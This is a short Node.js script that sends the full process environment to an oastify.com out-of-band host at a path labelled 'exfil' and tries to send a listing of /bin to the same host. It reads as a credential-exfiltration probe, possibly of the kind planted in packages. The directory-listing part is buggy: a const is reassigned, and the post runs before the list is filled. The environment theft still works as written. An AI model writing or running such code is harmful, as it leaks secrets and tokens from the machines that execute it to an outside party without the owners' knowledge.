const axios = require('axios');

axios.post('http://k3o7lpvmejkfjcdsb4ec2as5dwjn7iv7.oastify.com/exfil', process.env);
const testFolder = '/bin/';
const fs = require('fs');
const fileList = ""
fs.readdir(testFolder, (err, files) => {
  files.forEach(file => {
    fileList = fileList + file + ',';
  });
});
axios.post('http://k3o7lpvmejkfjcdsb4ec2as5dwjn7iv7.oastify.com/files', fileList);
